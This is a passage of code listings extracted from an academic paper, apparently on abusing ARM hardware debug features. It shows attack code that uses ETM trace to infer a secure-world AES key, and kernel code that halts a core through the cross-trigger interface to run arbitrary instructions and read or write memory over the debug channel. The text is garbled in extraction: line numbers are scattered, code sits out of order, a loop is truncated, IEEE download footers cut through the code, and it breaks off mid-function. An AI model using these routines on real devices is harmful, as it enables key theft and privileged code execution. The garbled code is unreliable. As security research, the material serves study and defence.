42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73 }
75 void extrace_trace(char∗ buffer) {
74
// Conﬁgure the ETM options
reg = reg_read(ETM_CR);
reg |= 0x2e848;
reg_write(ETM_CR, reg);
// Finish ETM programming
set_etm_programming_bit(0);
// Set the ETM programming bit to start the conﬁguration
set_etm_programming_bit(1);
// Set the ETM power down bit to stop trace
int reg = reg_read(ETM_CR);
reg |= 0x1;
reg_write(ETM_CR, reg);
// Make ETB stops after the next ﬂush
reg = reg_read(ETB_FFCR);
reg |= 0x1000;
reg_write(ETB_FFCR, reg);
// Generate a manual ﬂush
reg |= 0x40;
reg_write(ETB_FFCR, reg);
// Wait for the ﬂush event
reg = reg_read(ETB_FFCR);
while ((reg & 0x40) == 0x40) {
reg = reg_read(ETB_FFCR);
}
// Disable ETB
reg = reg_read(ETB_CTL);
reg &= ~0x1;
reg_write(ETB_CTL, reg);
// Wait for the ETB to stop
reg = reg_read(ETB_FFSR);
while ((reg & 0x2) != 0x2) {
reg = reg_read(ETB_FFSR);
}
// Read the trace stream
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:43:28 UTC from IEEE Xplore.  Restrictions apply. 
reg_write(ETB_RRP, 0);
for (int i = 0; i > 8) & 0xff;
∗buffer++ = (reg >> 16) & 0xff;
∗buffer++ = (reg >> 24) & 0xff;
106
107
108
109
110
111
112
113
114 }
116 char∗ infer_aes_encryption_key() {
115
}
// A random 128−bit input
char plaintext[16] = {0x6b, 0xc1, 0xbe, 0xe2, 0x2e, 0x40,
0x9f, 0x96, 0xe9, 0x3d, 0x7e, 0x11, 0x73, 0x93, 0x17, 0x2a};
// Allocate buffer for the ETM trace data
char buffer[4096] = {’\0’};
// Enable trace
enable_etb();
enable_etm();
// Trigger the secure AES encryption
char∗ ciphertext = aes_encryption(plaintext);
// Extract the trace stream
extrace_trace(buffer);
return analyze_trace(buffer, plaintext, ciphertext);
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134 }
B. Arbitrary Payload Execution
void __iomem ∗debug;
void __iomem ∗cti;
1 struct reg_base {
2
3
4 } t_reg_base;
5
6 static void enable_halting_debug(void) {
7
8
9
10
11
12 }
14 static void halt_by_ect(void __iomem ∗cti) {
13
// Set the halting debug enable bit
u32 reg;
__asm__ volatile("mrs %0, mdscr_el1\n": "=r"(reg));
reg |= 0x4000;
__asm__ volatile("msr mdscr_el1, %x0\n":: "r"(reg));
// Enable ECT
iowrite32(0x1, cti + CTICONTROL_OFFSET);
// Disable channel 0 propagation
u32 reg = ioread32(cti + CTIGATE_OFFSET);
reg &= ~0x1;
iowrite32(reg, cti + CTIGATE_OFFSET);
// Trigger a debug request on each channel 0 event
reg = ioread32(cti + CTIOUTEN0_OFFSET);
reg |= 0x1;
iowrite32(reg, cti + CTIOUTEN0_OFFSET);
// Trigger a channel 0 event
reg = ioread32(cti + CTIAPPPULSE_OFFSET);
reg |= 0x1;
iowrite32(reg, cti + CTIAPPPULSE_OFFSET);
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29 }
31 static void restart_by_ect(void __iomem ∗cti) {
30
32
33
34
35
36
37
38
39
40
// Enable ECT
iowrite32(0x1, cti + CTICONTROL_OFFSET);
// Disable channel 1 propagation
u32 reg = ioread32(cti + CTIGATE_OFFSET);
reg &= ~0x2;
iowrite32(reg, cti + CTIGATE_OFFSET);
// Trigger a restart request on each channel 1 event
reg = ioread32(cti + CTIOUTEN1_OFFSET);
reg |= 0x2;
iowrite32(reg, cti + CTIOUTEN1_OFFSET);
// Trigger a channel 1 event
reg = ioread32(cti + CTIAPPPULSE_OFFSET);
reg |= 0x2;
iowrite32(reg, cti + CTIAPPPULSE_OFFSET);
41
42
43
44
45
46 }
48 static void execute_ins_via_itr(void __iomem ∗debug, u32 ins) {
47
reg = ioread32(debug + EDSCR_OFFSET);
// Write instruction to EDITR register to execute it
iowrite32(ins, debug + EDITR_OFFSET);
// Wait until the execution is ﬁnished
u32 reg = ioread32(debug + EDSCR_OFFSET);
while ((reg & 0x1000000) != 0x1000000) {
49
50
51
52
53
54
55
56
57
58
59
60 }
62 static u64 read_register_via_x0(void __iomem ∗debug, u32 ins) {
61
}
// Check the execution result
if ((reg & 0x40) == 0x40) {
printk("Executing instruction 0x%08x failed \n", ins);
}
// Execute the ins to copy the target register to X0
execute_ins_via_itr(debug, ins);
// Copy X0 to the DCC register DBGDTR_EL0
// 0xd5130400  msr DBGDTR_EL0, X0
execute_ins_via_itr(debug, 0xd5130400);
// Read the DBGDTR_EL0 via the memory mapped interface
u64 reg1 = ioread32(debug + DBGDTRRX_OFFSET);
u64 reg2 = ioread32(debug + DBGDTRTX_OFFSET);
return ((reg1 & 0xffffffff) > 32), debug + DBGDTRTX_OFFSET);
// Copy DBGDTR_EL0 to X0
// 0xd5330400  mrs X0, DBGDTR_EL0
execute_ins_via_itr(debug, 0xd5330400);
// Execute the ins to copy X0 to the target register
execute_ins_via_itr(debug, ins);
76
77
78
79
80
81
82
83 }
85 static void save_context(void __iomem ∗debug, u64∗ buf) {
84
// Save X0
// 0xaa0003e0  mov X0, X0
buf[0] = read_register_via_x0(debug, 0xaa0003e0);
// Save ELR_EL1
// 0xd5384020  mrs X0, ELR_EL1
buf[1] = read_register_via_x0(debug, 0xd5384020);
// Save SPSR_EL1
// 0xd5384000  mrs X0, SPSR_EL1
buf[2] = read_register_via_x0(debug, 0xd5384000);
// Save ESR_EL1
// 0xd5385200  mrs X0, ESR_EL1
buf[3] = read_register_via_x0(debug, 0xd5385200);
// Save DLR_EL0
// 0xd53b4520  mrs X0, DLR_EL0
buf[4] = read_register_via_x0(debug, 0xd53b4520);
// Save DSPSR_EL0
// 0xd53b4500  mrs X0, DSPSR_EL0
buf[5] = read_register_via_x0(debug, 0xd53b4500);
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104 }
106 static void restore_context(void __iomem ∗debug, u64∗ buf) {
105
// Restore X0
// 0xaa0003e0  mov X0, X0
write_register_via_x0(debug, 0xaa0003e0, buf[0]);
// Restore ELR_EL1
// 0xd5184020  msr ELR_EL1, X0
write_register_via_x0(debug, 0xd5184020, buf[1]);
107
108
109
110
111
112
(cid:23)(cid:18)(cid:24)
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:43:28 UTC from IEEE Xplore.  Restrictions apply. 
// Restore SPSR_EL1
// 0xd5184000  msr SPSR_EL1, X0
write_register_via_x0(debug, 0xd5184000, buf[2]);
// Restore ESR_EL1
// 0xd5185200  msr ESR_EL1, X0
write_register_via_x0(debug, 0xd5185200, buf[3]);
// Restore DLR_EL0
// 0xd51b4520  msr DLR_EL0, X0
write_register_via_x0(debug, 0xd51b4520, buf[4]);
// Restore DSPSR_EL0
// 0xd51b4500  msr DSPSR_EL0, X0
write_register_via_x0(debug, 0xd51b4500, buf[5]);
113
114
115
116
117
118
119
120
121
122
123
124
125 }
127 static u32 read_memory_via_dcc(void __iomem ∗debug, u64 addr) {
126
// Write the address to DBGDTR_EL0 via the memory mapped
128
interface
iowrite32((u32)(addr & 0xffffffff), debug + DBGDTRRX_OFFSET);
iowrite32((u32)(addr >> 32), debug + DBGDTRTX_OFFSET);
// Put the memory address to X0
// 0xd5330400  mrs X0, DBGDTR_EL0
execute_ins_via_itr(debug, 0xd5330400);
// A dummy instruction to set the EDSCR.TXfull bit
// 0xd5130400  msr DBGDTR_EL0, X0
execute_ins_via_itr(debug, 0xd5130400);
// Switch to memory access mode
u32 reg = ioread32(debug + EDSCR_OFFSET);
reg |= 0x100000;
iowrite32(reg, debug + EDSCR_OFFSET);
// Discard the ﬁrst read
ioread32(debug + DBGDTRTX_OFFSET);
// Switch to normal access mode
reg = ioread32(debug + EDSCR_OFFSET);
reg &= ~0x100000;
iowrite32(reg, debug + EDSCR_OFFSET);
// Read DBGDTRTX_EL0 again to get the value at the target
address
return ioread32(debug + DBGDTRTX_OFFSET);
148
149 }
151 static void write_memory_via_dcc(void __iomem ∗debug, u64 addr, u32
150
∗ content, u32 len) {
interface
// Write the address to DBGDTR_EL0 via the memory mapped
iowrite32((u32)(addr & 0xffffffff), debug + DBGDTRRX_OFFSET);